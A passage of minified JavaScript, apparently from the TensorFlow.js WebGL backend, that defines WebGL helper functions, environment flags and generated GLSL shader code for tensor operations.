                    case n.INVALID_VALUE:
                        return "INVALID_VALUE";
                    case n.INVALID_OPERATION:
                        return "INVALID_OPERATION";
                    case n.INVALID_FRAMEBUFFER_OPERATION:
                        return "INVALID_FRAMEBUFFER_OPERATION";
                    case n.OUT_OF_MEMORY:
                        return "OUT_OF_MEMORY";
                    case n.CONTEXT_LOST_WEBGL:
                        return "CONTEXT_LOST_WEBGL";
                    default:
                        return `Unknown error code ${t}`
                    }
                }(n, t))
        }(n),
        e
    }
    !function(n) {
        n[n.DENSE = 0] = "DENSE",
        n[n.SHARED_BATCH = 1] = "SHARED_BATCH"
    }(sa || (sa = {})),
    function(n) {
        n[n.RENDER = 0] = "RENDER",
        n[n.UPLOAD = 1] = "UPLOAD",
        n[n.PIXELS = 2] = "PIXELS",
        n[n.DOWNLOAD = 3] = "DOWNLOAD"
    }(an || (an = {})),
    function(n) {
        n[n.UNPACKED_FLOAT16 = 0] = "UNPACKED_FLOAT16",
        n[n.UNPACKED_FLOAT32 = 1] = "UNPACKED_FLOAT32",
        n[n.PACKED_4X1_UNSIGNED_BYTE = 2] = "PACKED_4X1_UNSIGNED_BYTE",
        n[n.PACKED_2X2_FLOAT32 = 3] = "PACKED_2X2_FLOAT32",
        n[n.PACKED_2X2_FLOAT16 = 4] = "PACKED_2X2_FLOAT16"
    }(we || (we = {}));
    function dV(n) {
        return !!(z().getBool("WEBGL_RENDER_FLOAT32_ENABLED") || 0 === n || 5.96e-8 < Math.abs(n) && Math.abs(n) < 65504)
    }
    function wl(n, t) {
        return ds(n, (()=>n.getExtension(t)), 'Extension "' + t + '" not supported on this browser.')
    }
    const mV = /ERROR: [0-9]+:([0-9]+):/g;
    function i1(n, t) {
        const e = mV.exec(t);
        if (null == e)
            return console.log(`Couldn't parse line number in error: ${t}`),
            void console.log(n);
        const s = +e[1]
          , o = n.split("\n")
          , r = o.length.toString().length + 2
          , i = o.map(((d,h)=>Wo((h + 1).toString(), r) + d));
        let a = 0;
        for (let d = 0; d < i.length; d++)
            a = Math.max(i[d].length, a);
        const c = i.slice(0, s - 1)
          , l = i.slice(s - 1, s)
          , u = i.slice(s);
        console.log(c.join("\n")),
        console.log(t.split("\n")[0]),
        console.log(`%c ${Wo(l[0], a)}`, "border:1px solid red; background-color:#e3d2d2; color:#a61717"),
        console.log(u.join("\n"))
    }
    function wp(n, t) {
        if (ot(n, (()=>n.validateProgram(t))),
        !1 === n.getProgramParameter(t, n.VALIDATE_STATUS))
            throw console.log(n.getProgramInfoLog(t)),
            new Error("Shader program validation failed.")
    }
    function a1(n, t, e, s, o, r, i) {
        const a = n.getAttribLocation(t, e);
        return -1 !== a && (ot(n, (()=>n.bindBuffer(n.ARRAY_BUFFER, s))),
        ot(n, (()=>n.vertexAttribPointer(a, o, n.FLOAT, !1, r, i))),
        ot(n, (()=>n.enableVertexAttribArray(a))),
        !0)
    }
    function vV(n, t, e) {
        (function RV(n, t) {
            const e = n.MAX_COMBINED_TEXTURE_IMAGE_UNITS - 1
              , s = t + n.TEXTURE0;
            if (s < n.TEXTURE0 || s > e) {
                throw new Error(`textureUnit must be in ${`[gl.TEXTURE0, gl.TEXTURE${e}]`}.`)
            }
        }
        )(n, e),
        ot(n, (()=>n.activeTexture(n.TEXTURE0 + e))),
        ot(n, (()=>n.bindTexture(n.TEXTURE_2D, t)))
    }
    function Cp(n, t, e) {
        ot(n, (()=>n.bindFramebuffer(n.FRAMEBUFFER, e))),
        ot(n, (()=>n.framebufferTexture2D(n.FRAMEBUFFER, n.COLOR_ATTACHMENT0, n.TEXTURE_2D, t, 0)))
    }
    function c1(n, t) {
        ot(n, (()=>n.bindFramebuffer(n.FRAMEBUFFER, t))),
        ot(n, (()=>n.framebufferTexture2D(n.FRAMEBUFFER, n.COLOR_ATTACHMENT0, n.TEXTURE_2D, null, 0)))
    }
    function Cl(n) {
        const t = n.checkFramebufferStatus(n.FRAMEBUFFER);
        if (t !== n.FRAMEBUFFER_COMPLETE)
            throw new Error("Error binding framebuffer: " + function NV(n, t) {
                switch (t) {
                case n.FRAMEBUFFER_INCOMPLETE_ATTACHMENT:
                    return "FRAMEBUFFER_INCOMPLETE_ATTACHMENT";
                case n.FRAMEBUFFER_INCOMPLETE_MISSING_ATTACHMENT:
                    return "FRAMEBUFFER_INCOMPLETE_MISSING_ATTACHMENT";
                case n.FRAMEBUFFER_INCOMPLETE_DIMENSIONS:
                    return "FRAMEBUFFER_INCOMPLETE_DIMENSIONS";
                case n.FRAMEBUFFER_UNSUPPORTED:
                    return "FRAMEBUFFER_UNSUPPORTED";
                default:
                    return `unknown error ${t}`
                }
            }(n, t))
    }
    function ds(n, t, e) {
        const s = ot(n, (()=>t()));
        if (null == s)
            throw new Error(e);
        return s
    }
    function ur(n, t=2) {
        return Z(n.slice(0, n.length - t))
    }
    function dr(n) {
        if (0 === n.length)
            throw Error("Cannot get rows and columns of an empty shape array.");
        return [n.length > 1 ? n[n.length - 2] : 1, n[n.length - 1]]
    }
    function vl(n) {
        let t = [1, 1, 1];
        return 0 === n.length || 1 === n.length && 1 === n[0] || (t = [ur(n), ...dr(n)]),
        t
    }
    function Sl(n) {
        return n % 2 == 0
    }
    function kl(n, t) {
        if (Rt(n = n.slice(-2), t = t.slice(-2)) || !n.length || !t.length || 0 === n[0] || 0 === n[1] || 0 === t[0] || 0 === t[1])
            return !0;
        if (n.length !== t.length) {
            const e = n[n.length - 1]
              , s = t[t.length - 1];
            if (e === s || Sl(e) && Sl(s) && (1 === n[0] || 1 === t[0]))
                return !0
        }
        return n[1] === t[1] && Sl(n[0]) && Sl(t[0])
    }
    let vp, Sp;
    function wn(n, t) {
        return null != n.getExtension(t)
    }
    function l1(n) {
        try {
            if (null != Mn(n))
                return !0
        } catch (t) {
            return console.log("Error when getting WebGL context: ", t),
            !1
        }
        return !1
    }
    function WV(n) {
        if (0 === n)
            return !1;
        const t = Mn(n);
        if (1 !== n) {
            if (wn(t, "EXT_color_buffer_float"))
                return kp(t);
            const s = "EXT_color_buffer_half_float";
            if (wn(t, s)) {
                const o = t.getExtension(s);
                return function MV(n, t) {
                    const e = Ip(n, t)
                      , s = n.createTexture();
                    n.bindTexture(n.TEXTURE_2D, s),
                    n.texImage2D(n.TEXTURE_2D, 0, e.internalFormatHalfFloat, 1, 1, 0, e.textureFormatFloat, e.textureTypeHalfFloat, null);
                    const i = n.createFramebuffer();
                    n.bindFramebuffer(n.FRAMEBUFFER, i),
                    n.framebufferTexture2D(n.FRAMEBUFFER, n.COLOR_ATTACHMENT0, n.TEXTURE_2D, s, 0);
                    const a = n.checkFramebufferStatus(n.FRAMEBUFFER) === n.FRAMEBUFFER_COMPLETE;
                    return n.bindTexture(n.TEXTURE_2D, null),
                    n.bindFramebuffer(n.FRAMEBUFFER, null),
                    n.deleteTexture(s),
                    n.deleteFramebuffer(i),
                    a
                }(t, o)
            }
            return !1
        }
        return !(!wn(t, "OES_texture_float") || !wn(t, "WEBGL_color_buffer_float")) && kp(t)
    }
    function kp(n) {
        const t = Ip(n)
          , e = n.createTexture();
        n.bindTexture(n.TEXTURE_2D, e),
        n.texImage2D(n.TEXTURE_2D, 0, t.internalFormatFloat, 1, 1, 0, t.textureFormatFloat, t.textureTypeFloat, null);
        const r = n.createFramebuffer();
        n.bindFramebuffer(n.FRAMEBUFFER, r),
        n.framebufferTexture2D(n.FRAMEBUFFER, n.COLOR_ATTACHMENT0, n.TEXTURE_2D, e, 0);
        const i = n.checkFramebufferStatus(n.FRAMEBUFFER) === n.FRAMEBUFFER_COMPLETE;
        return n.bindTexture(n.TEXTURE_2D, null),
        n.bindFramebuffer(n.FRAMEBUFFER, null),
        n.deleteTexture(e),
        n.deleteFramebuffer(r),
        i
    }
    function ra(n, t) {
        Array.isArray(n) || (n = [n]),
        n.forEach((e=>{
            null != e && v("complex64" !== e.dtype, (()=>`${t} does not support complex64 tensors in the WebGL backend.`))
        }
        ))
    }
    const at = z();
    function De() {
        let n, t, e, s, o, r, i, a, c, l;
        return 2 === z().getNumber("WEBGL_VERSION") ? (n = "#version 300 es",
        t = "in",
        e = "out",
        s = "in",
        o = "texture",
        r = "outputColor",
        i = "out vec4 outputColor;",
        a = z().getBool("WEBGL2_ISNAN_CUSTOM") ? "\n      bool isnan_custom(float val) {\n        uint floatToUint = floatBitsToUint(val);\n        return (floatToUint & 0x7fffffffu) > 0x7f800000u;\n      }\n\n      bvec4 isnan_custom(vec4 val) {\n        return bvec4(isnan_custom(val.x),\n          isnan_custom(val.y), isnan_custom(val.z), isnan_custom(val.w));\n      }\n\n      #define isnan(value) isnan_custom(value)\n    " : "",
        c = "",
        l = "\n      #define round(value) newRound(value)\n      int newRound(float value) {\n        return int(floor(value + 0.5));\n      }\n\n      ivec4 newRound(vec4 value) {\n        return ivec4(floor(value + vec4(0.5)));\n      }\n    ") : (n = "",
        t = "attribute",
        e = "varying",
        s = "varying",
        o = "texture2D",
        r = "gl_FragColor",
        i = "",
        a = "\n      #define isnan(value) isnan_custom(value)\n      bool isnan_custom(float val) {\n        return (val > 0. || val < 1. || val == 0.) ? false : true;\n      }\n      bvec4 isnan_custom(vec4 val) {\n        return bvec4(isnan(val.x), isnan(val.y), isnan(val.z), isnan(val.w));\n      }\n    ",
        c = "\n      uniform float INFINITY;\n\n      bool isinf(float val) {\n        return abs(val) == INFINITY;\n      }\n      bvec4 isinf(vec4 val) {\n        return equal(abs(val), vec4(INFINITY));\n      }\n    ",
        l = "\n      int round(float value) {\n        return int(floor(value + 0.5));\n      }\n\n      ivec4 round(vec4 value) {\n        return ivec4(floor(value + vec4(0.5)));\n      }\n    "),
        {
            version: n,
            attribute: t,
            varyingVs: e,
            varyingFs: s,
            texture2D: o,
            output: r,
            defineOutput: i,
            defineSpecialNaN: a,
            defineSpecialInf: c,
            defineRound: l
        }
    }
    function vo(n, t, e="index") {
        const s = ct(t);
        return s.map(((o,r)=>`${`int ${n[r]} = ${e} / ${o}`}; ${r === s.length - 1 ? `int ${n[r + 1]} = ${e} - ${n[r]} * ${o}` : `index -= ${n[r]} * ${o}`};`)).join("")
    }
    function Tl(n, t, e="index") {
        const s = ct(t);
        return s.map(((o,r)=>`${`int ${n[r]} = ${e} / outShapeStrides[${r}]`}; ${r === s.length - 1 ? `int ${n[r + 1]} = ${e} - ${n[r]} * outShapeStrides[${r}]` : `index -= ${n[r]} * outShapeStrides[${r}]`};`)).join("")
    }
    function zV(n, t, e="index") {
        const o = function FV(n, t) {
            const e = n.length
              , s = n.map((r=>`${t}[${r}]`))
              , o = new Array(e - 1);
            o[e - 2] = s[e - 1];
            for (let r = e - 3; r >= 0; --r)
                o[r] = `(${o[r + 1]} * ${s[r + 1]})`;
            return o
        }(n.map(((r,i)=>i)), t);
        return o.map(((r,i)=>`${`int ${n[i]} = ${e} / ${o[i]}`}; ${i === o.length - 1 ? `int ${n[i + 1]} = ${e} - ${n[i]} * ${o[i]}` : `index -= ${n[i]} * ${o[i]}`};`)).join("")
    }
    function Tp(n) {
        const t = ct(n).map((e=>e.toString()));
        return `\n  int getFlatIndex(ivec3 coords) {\n    return coords.x * ${t[0]} + coords.y * ${t[1]} + coords.z;\n  }\n`
    }
    at.registerFlag("HAS_WEBGL", (()=>at.getNumber("WEBGL_VERSION") > 0)),
    at.registerFlag("WEBGL_VERSION", (()=>l1(2) ? 2 : l1(1) ? 1 : 0)),
    at.registerFlag("WEBGL_CHECK_NUMERICAL_PROBLEMS", (()=>!1)),
    at.registerFlag("WEBGL_BUFFER_SUPPORTED", (()=>2 === at.get("WEBGL_VERSION"))),
    at.registerFlag("WEBGL_CPU_FORWARD", (()=>!0)),
    at.registerFlag("WEBGL_FORCE_F16_TEXTURES", (()=>!1)),
    at.registerFlag("WEBGL_PACK", (()=>at.getBool("HAS_WEBGL"))),
    at.registerFlag("WEBGL_PACK_NORMALIZATION", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_PACK_CLIP", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_PACK_DEPTHWISECONV", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_PACK_BINARY_OPERATIONS", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_PACK_UNARY_OPERATIONS", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_PACK_ARRAY_OPERATIONS", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_PACK_IMAGE_OPERATIONS", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_PACK_REDUCE", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_LAZILY_UNPACK", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_CONV_IM2COL", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_PACK_CONV2DTRANSPOSE", (()=>at.getBool("WEBGL_PACK"))),
    at.registerFlag("WEBGL_MAX_TEXTURE_SIZE", (()=>function GV(n) {
        if (null == vp) {
            const t = Mn(n);
            vp = t.getParameter(t.MAX_TEXTURE_SIZE)
        }
        return vp
    }(at.getNumber("WEBGL_VERSION")))),
    at.registerFlag("WEBGL_MAX_TEXTURES_IN_SHADER", (()=>function LV(n) {
        if (null == Sp) {
            const t = Mn(n);
            Sp = t.getParameter(t.MAX_TEXTURE_IMAGE_UNITS)
        }
        return Math.min(16, Sp)
    }(at.getNumber("WEBGL_VERSION")))),
    at.registerFlag("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION", (()=>{
        const n = at.getNumber("WEBGL_VERSION");
        return 0 === n ? 0 : function EV(n) {
            if (0 === n)
                return 0;
            let t;
            const e = Mn(n);
            return t = wn(e, "EXT_disjoint_timer_query_webgl2") && 2 === n ? 2 : wn(e, "EXT_disjoint_timer_query") ? 1 : 0,
            t
        }(n)
    }
    )),
    at.registerFlag("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_RELIABLE", (()=>at.getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_VERSION") > 0 && !hm())),
    at.registerFlag("WEBGL_RENDER_FLOAT32_CAPABLE", (()=>function DV(n) {
        if (0 === n)
            return !1;
        const t = Mn(n);
        if (1 === n) {
            if (!wn(t, "OES_texture_float"))
                return !1
        } else if (!wn(t, "EXT_color_buffer_float"))
            return !1;
        return kp(t)
    }(at.getNumber("WEBGL_VERSION")))),
    at.registerFlag("WEBGL_RENDER_FLOAT32_ENABLED", (()=>!at.getBool("WEBGL_FORCE_F16_TEXTURES") && at.getBool("WEBGL_RENDER_FLOAT32_CAPABLE"))),
    at.registerFlag("WEBGL_DOWNLOAD_FLOAT_ENABLED", (()=>WV(at.getNumber("WEBGL_VERSION")))),
    at.registerFlag("WEBGL_FENCE_API_ENABLED", (()=>function VV(n) {
        return 2 === n && null != Mn(n).fenceSync
    }(at.getNumber("WEBGL_VERSION")))),
    at.registerFlag("WEBGL_SIZE_UPLOAD_UNIFORM", (()=>at.getBool("WEBGL_RENDER_FLOAT32_ENABLED") ? 4 : 0)),
    at.registerFlag("WEBGL_DELETE_TEXTURE_THRESHOLD", (()=>-1), (n=>{
        if ("number" != typeof n)
            throw new Error(`WEBGL_DELETE_TEXTURE_THRESHOLD must be a number but got ${n}.`);
        if (n < 0 && -1 !== n)
            throw new Error(`WEBGL_DELETE_TEXTURE_THRESHOLD must be -1 (indicating never delete) or at least 0, but got ${n}.`)
    }
    )),
    at.registerFlag("WEBGL_FLUSH_THRESHOLD", (()=>hm() ? 1 : -1), (n=>{
        if ("number" != typeof n)
            throw new Error(`WEBGL_FLUSH_THRESHOLD must be a number but got ${n}.`);
        if (n < 0 && -1 !== n)
            throw new Error(`WEBGL_FLUSH_THRESHOLD must be -1 (indicating never manual flush) or at least 0, but got ${n}.`)
    }
    )),
    at.registerFlag("CPU_HANDOFF_SIZE_THRESHOLD", (()=>128)),
    at.registerFlag("WEBGL_USE_SHAPES_UNIFORMS", (()=>!1)),
    at.registerFlag("TOPK_LAST_DIM_CPU_HANDOFF_SIZE_THRESHOLD", (()=>1e5)),
    at.registerFlag("TOPK_K_CPU_HANDOFF_THRESHOLD", (()=>128)),
    at.registerFlag("WEBGL_EXP_CONV", (()=>!1)),
    at.registerFlag("SOFTWARE_WEBGL_ENABLED", (()=>at.getBool("IS_TEST"))),
    at.registerFlag("WEBGL_MAX_SIZE_FOR_NARROW_TEXTURE", (()=>1 / 0)),
    at.registerFlag("WEBGL_AUTO_SQUARIFY_NARROW_TEXTURE_SHAPE", (()=>!1)),
    at.registerFlag("WEBGL2_ISNAN_CUSTOM", (()=>!1)),
    at.registerFlag("ENGINE_COMPILE_ONLY", (()=>!1));
    const u1 = "\n  const float FLOAT_MAX = 1.70141184e38;\n  const float FLOAT_MIN = 1.17549435e-38;\n\n  lowp vec4 encode_float(highp float v) {\n    if (isnan(v)) {\n      return vec4(255, 255, 255, 255);\n    }\n\n    highp float av = abs(v);\n\n    if(av < FLOAT_MIN) {\n      return vec4(0.0, 0.0, 0.0, 0.0);\n    } else if(v > FLOAT_MAX) {\n      return vec4(0.0, 0.0, 128.0, 127.0) / 255.0;\n    } else if(v < -FLOAT_MAX) {\n      return vec4(0.0, 0.0,  128.0, 255.0) / 255.0;\n    }\n\n    highp vec4 c = vec4(0,0,0,0);\n\n    highp float e = floor(log2(av));\n    highp float m = exp2(fract(log2(av))) - 1.0;\n\n    c[2] = floor(128.0 * m);\n    m -= c[2] / 128.0;\n    c[1] = floor(32768.0 * m);\n    m -= c[1] / 32768.0;\n    c[0] = floor(8388608.0 * m);\n\n    highp float ebias = e + 127.0;\n    c[3] = floor(ebias / 2.0);\n    ebias -= c[3] * 2.0;\n    c[2] += floor(ebias) * 128.0;\n\n    c[3] += 128.0 * step(0.0, -v);\n\n    return c / 255.0;\n  }\n"
      , {getBroadcastDims: d1} = DT;
    function XV(n, t, e) {
        const s = [];
        if (n.forEach((p=>{
            const f = Z(p.shapeInfo.logicalShape);
            if (p.shapeInfo.isUniform ? s.push(`uniform float ${p.name}${f > 1 ? `[${f}]` : ""};`) : (s.push(`uniform sampler2D ${p.name};`),
            s.push(`uniform int offset${p.name};`)),
            e.enableShapeUniforms) {
                const {uniformShape: m} = Rp(e.packedInputs, p.shapeInfo.logicalShape, p.shapeInfo.texShape);
                switch (m.length) {
                case 1:
                    s.push(`uniform int ${p.name}Shape;`);
                    break;
                case 2:
                    s.push(`uniform ivec2 ${p.name}Shape;`);
                    break;
                case 3:
                    s.push(`uniform ivec3 ${p.name}Shape;`);
                    break;
                case 4:
                    s.push(`uniform ivec4 ${p.name}Shape;`)
                }
                s.push(`uniform ivec2 ${p.name}TexShape;`)
            }
        }
        )),
        e.enableShapeUniforms) {
            switch (t.logicalShape.length) {
            case 1:
                s.push("uniform int outShape;");
                break;
            case 2:
                s.push("uniform ivec2 outShape;"),
                s.push("uniform int outShapeStrides;");
                break;
            case 3:
                s.push("uniform ivec3 outShape;"),
                s.push("uniform ivec2 outShapeStrides;");
                break;
            case 4:
                s.push("uniform ivec4 outShape;"),
                s.push("uniform ivec3 outShapeStrides;")
            }
            s.push("uniform ivec2 outTexShape;")
        }
        e.customUniforms && e.customUniforms.forEach((p=>{
            s.push(`uniform ${p.type} ${p.name}${p.arrayIndex ? `[${p.arrayIndex}]` : ""};`)
        }
        ));
        const o = s.join("\n")
          , r = n.map((p=>function AV(n, t, e=!1, s) {
            let o = "";
            o += e ? h1(n, s) : hr(n, s);
            const r = n.shapeInfo.logicalShape
              , i = t.logicalShape;
            return r.length <= i.length && (o += e ? function yF(n, t) {
                const e = n.name
                  , s = e.charAt(0).toUpperCase() + e.slice(1)
                  , o = "get" + s + "AtOutCoords"
                  , r = n.shapeInfo.logicalShape.length
                  , i = t.logicalShape.length
                  , a = d1(n.shapeInfo.logicalShape, t.logicalShape)
                  , c = Wt(i)
                  , l = i - r;
                let u;
                const d = ["x", "y", "z", "w", "u", "v"];
                u = 0 === r ? "" : i < 2 && a.length >= 1 ? "coords = 0;" : a.map((x=>`coords.${d[x + l]} = 0;`)).join("\n");
                let h = "";
                h = i < 2 && r > 0 ? "coords" : n.shapeInfo.logicalShape.map(((x,I)=>`coords.${d[I + l]}`)).join(", ");
                let p = "return outputValue;";
                const m = 1 === Z(n.shapeInfo.logicalShape)
                  , b = 1 === Z(t.logicalShape);
                if (1 !== r || m || b) {
                    if (m && !b)
                        p = 1 === i ? "\n        return vec4(outputValue.x, outputValue.x, 0., 0.);\n      " : "\n        return vec4(outputValue.x);\n      ";
                    else if (a.length) {
                        const x = r - 2
                          , I = r - 1;
                        a.indexOf(x) > -1 && a.indexOf(I) > -1 ? p = "return vec4(outputValue.x);" : a.indexOf(x) > -1 ? p = "return vec4(outputValue.x, outputValue.y, outputValue.x, outputValue.y);" : a.indexOf(I) > -1 && (p = "return vec4(outputValue.xx, outputValue.zz);")
                    }
                } else
                    p = "\n      return vec4(outputValue.xy, outputValue.xy);\n    ";
                return `\n    vec4 ${o}() {\n      ${c} coords = getOutputCoords();\n      ${u}\n      vec4 outputValue = get${s}(${h});\n      ${p}\n    }\n  `
            }(n, t) : function IF(n, t) {
                const e = n.name
                  , s = e.charAt(0).toUpperCase() + e.slice(1)
                  , o = "get" + s + "AtOutCoords"
                  , r = t.texShape
                  , i = n.shapeInfo.texShape
                  , a = n.shapeInfo.logicalShape.length
                  , c = t.logicalShape.length;
                if (!n.shapeInfo.isUniform && a === c && null == n.shapeInfo.flatOffset && Rt(i, r))
                    return `\n      float ${o}() {\n        return sampleTexture(${e}, resultUV);\n      }\n    `;
                const l = Wt(c)
                  , u = d1(n.shapeInfo.logicalShape, t.logicalShape)
                  , d = c - a;
                let h;
                const p = ["x", "y", "z", "w", "u", "v"];
                h = 0 === a ? "" : c < 2 && u.length >= 1 ? "coords = 0;" : u.map((m=>`coords.${p[m + d]} = 0;`)).join("\n");
                let f = "";
                return f = c < 2 && a > 0 ? "coords" : n.shapeInfo.logicalShape.map(((m,g)=>`coords.${p[g + d]}`)).join(", "),
                `\n    float ${o}() {\n      ${l} coords = getOutputCoords();\n      ${h}\n      return get${s}(${f});\n    }\n  `
            }(n, t)),
            o
        }(p, t, e.packedInputs, e.enableShapeUniforms))).join("\n")
          , i = t.texShape
          , a = De()
          , c = function KV(n) {
            return `\n    float sampleTexture(sampler2D textureSampler, vec2 uv) {\n      return ${n.texture2D}(textureSampler, uv).r;\n    }\n  `
        }(a);
        let l, u, d = function HV(n) {
            return `${n.version}\n    precision highp float;\n    precision highp int;\n    precision highp sampler2D;\n    ${n.varyingFs} vec2 resultUV;\n    ${n.defineOutput}\n    const vec2 halfCR = vec2(0.5, 0.5);\n\n    struct ivec5\n    {\n      int x;\n      int y;\n      int z;\n      int w;\n      int u;\n    };\n\n    struct ivec6\n    {\n      int x;\n      int y;\n      int z;\n      int w;\n      int u;\n      int v;\n    };\n\n    uniform float NAN;\n    ${n.defineSpecialNaN}\n    ${n.defineSpecialInf}\n    ${n.defineRound}\n\n    int imod(int x, int y) {\n      return x - y * (x / y);\n    }\n\n    int idiv(int a, int b, float sign) {\n      int res = a / b;\n      int mod = imod(a, b);\n      if (sign < 0. && mod != 0) {\n        res -= 1;\n      }\n      return res;\n    }\n\n    //Based on the work of Dave Hoskins\n    //https://www.shadertoy.com/view/4djSRW\n    #define HASHSCALE1 443.8975\n    float random(float seed){\n      vec2 p = resultUV * seed;\n      vec3 p3  = fract(vec3(p.xyx) * HASHSCALE1);\n      p3 += dot(p3, p3.yzx + 19.19);\n      return fract((p3.x + p3.y) * p3.z);\n    }\n\n    ${_V}\n    ${UV}\n    ${YV}\n  `
        }(a);
        return t.isPacked ? (l = function PV(n, t, e) {
            switch (n.length) {
            case 0:
                return p1();
            case 1:
                return function JV(n, t, e) {
                    const s = [Math.ceil(t[0] / 2), Math.ceil(t[1] / 2)];
                    return 1 === s[0] ? e ? "\n      int getOutputCoords() {\n        return 2 * int(resultUV.x * ceil(float(outTexShape[1]) / 2.0));\n      }\n    " : `\n      int getOutputCoords() {\n        return 2 * int(resultUV.x * ${s[1]}.0);\n      }\n    ` : 1 === s[1] ? e ? "\n      int getOutputCoords() {\n        return 2 * int(resultUV.y * ceil(float(outTexShape[0]) / 2.0));\n      }\n    " : `\n      int getOutputCoords() {\n        return 2 * int(resultUV.y * ${s[0]}.0);\n      }\n    ` : e ? "\n    int getOutputCoords() {\n      ivec2 packedTexShape = ivec2(ceil(float(outTexShape[0]) / 2.0), ceil(float(outTexShape[1]) / 2.0));\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(packedTexShape[0], packedTexShape[1]));\n      return 2 * (resTexRC.x * packedTexShape[1] + resTexRC.y);\n    }\n  " : `\n    int getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(${s[0]}, ${s[1]}));\n      return 2 * (resTexRC.x * ${s[1]} + resTexRC.y);\n    }\n  `
                }(0, t, e);
            case 2:
                return function rF(n, t, e) {
                    const s = [Math.ceil(t[0] / 2), Math.ceil(t[1] / 2)];
                    if (Rt(n, t))
                        return e ? "\n      ivec2 getOutputCoords() {\n        ivec2 packedTexShape = ivec2(ceil(float(outTexShape[0]) / 2.0), ceil(float(outTexShape[1]) / 2.0));\n        return 2 * ivec2(resultUV.yx * vec2(packedTexShape[0], packedTexShape[1]));\n      }\n    " : `\n      ivec2 getOutputCoords() {\n        return 2 * ivec2(resultUV.yx * vec2(${s[0]}, ${s[1]}));\n      }\n    `;
                    const o = Math.ceil(n[1] / 2);
                    return e ? "\n    ivec2 getOutputCoords() {\n      ivec2 packedTexShape = ivec2(ceil(float(outTexShape[0]) / 2.0), ceil(float(outTexShape[1]) / 2.0));\n      int texelsInLogicalRow = int(ceil(float(outShape[1]) / 2.0));\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(packedTexShape[0], packedTexShape[1]));\n\n      int index = resTexRC.x * packedTexShape[1] + resTexRC.y;\n      int r = 2 * (index / texelsInLogicalRow);\n      int c = imod(index, texelsInLogicalRow) * 2;\n\n      return ivec2(r, c);\n    }\n  " : `\n    ivec2 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(${s[0]}, ${s[1]}));\n\n      int index = resTexRC.x * ${s[1]} + resTexRC.y;\n      int r = 2 * (index / ${o});\n      int c = imod(index, ${o}) * 2;\n\n      return ivec2(r, c);\n    }\n  `
                }(n, t, e);
            case 3:
                return function qV(n, t, e) {
                    if (e)
                        return "\n    ivec3 getOutputCoords() {\n      ivec2 packedTexShape = ivec2(ceil(float(outTexShape[0]) / 2.0), ceil(float(outTexShape[1]) / 2.0));\n      int texelsInLogicalRow = int(ceil(float(outShape[2]) / 2.0));\n      int texelsInBatch = texelsInLogicalRow * int(ceil(float(outShape[1]) / 2.0));\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(packedTexShape[0], packedTexShape[1]));\n      int index = resTexRC.x * packedTexShape[1] + resTexRC.y;\n\n      int b = index / texelsInBatch;\n      index -= b * texelsInBatch;\n\n      int r = 2 * (index / texelsInLogicalRow);\n      int c = imod(index, texelsInLogicalRow) * 2;\n\n      return ivec3(b, r, c);\n    }\n  ";
                    const s = [Math.ceil(t[0] / 2), Math.ceil(t[1] / 2)]
                      , o = Math.ceil(n[2] / 2)
                      , r = o * Math.ceil(n[1] / 2);
                    return `\n    ivec3 getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(${s[0]}, ${s[1]}));\n      int index = resTexRC.x * ${s[1]} + resTexRC.y;\n\n      int b = index / ${r};\n      index -= b * ${r};\n\n      int r = 2 * (index / ${o});\n      int c = imod(index, ${o}) * 2;\n\n      return ivec3(b, r, c);\n    }\n  `
                }(n, t, e);
            default:
                return function eF(n, t, e) {
                    if (e)
                        return "\n    ivec4 getOutputCoords() {\n      ivec2 packedTexShape = ivec2(ceil(float(outTexShape[0]) / 2.0), ceil(float(outTexShape[1]) / 2.0));\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(packedTexShape[0], packedTexShape[1]));\n      int index = resTexRC.x * packedTexShape[1] + resTexRC.y;\n\n      int texelsInLogicalRow = int(ceil(float(outShape[3]) / 2.0));\n      int texelsInBatch = texelsInLogicalRow * int(ceil(float(outShape[2]) / 2.0));\n      int texelsInBatchN = texelsInBatch * outShape[1];\n\n      int b2 = index / texelsInBatchN;\n      index -= b2 * texelsInBatchN;\n\n      int b = index / texelsInBatch;\n      index -= b * texelsInBatch;\n\n      int r = 2 * (index / texelsInLogicalRow);\n      int c = imod(index, texelsInLogicalRow) * 2;\n\n      return ivec4(b2, b, r, c);\n    }\n  ";
                    const s = [Math.ceil(t[0] / 2), Math.ceil(t[1] / 2)]
                      , o = Math.ceil(n[n.length - 1] / 2)
                      , r = o * Math.ceil(n[n.length - 2] / 2);
                    let i = r
                      , a = ""
                      , c = "b, r, c";
                    for (let l = 2; l < n.length - 1; l++)
                        i *= n[n.length - l - 1],
                        a = `\n      int b${l} = index / ${i};\n      index -= b${l} * ${i};\n    ` + a,
                        c = `b${l}, ` + c;
                    return `\n    ivec${n.length} getOutputCoords() {\n      ivec2 resTexRC = ivec2(resultUV.yx *\n                             vec2(${s[0]}, ${s[1]}));\n      int index = resTexRC.x * ${s[1]} + resTexRC.y;\n\n      ${a}\n\n      int b = index / ${r};\n      index -= b * ${r};\n\n      int r = 2 * (index / ${o});\n      int c = imod(index, ${o}) * 2;\n\n      return ivec${n.length}(${c});\n    }\n  `
                }(n, t, e)
            }
        }(t.logicalShape, i, e.enableShapeUniforms),
        u = function BV(n) {
            return `\n    void setOutput(vec4 val) {\n      ${n.output} = val;\n    }\n  `
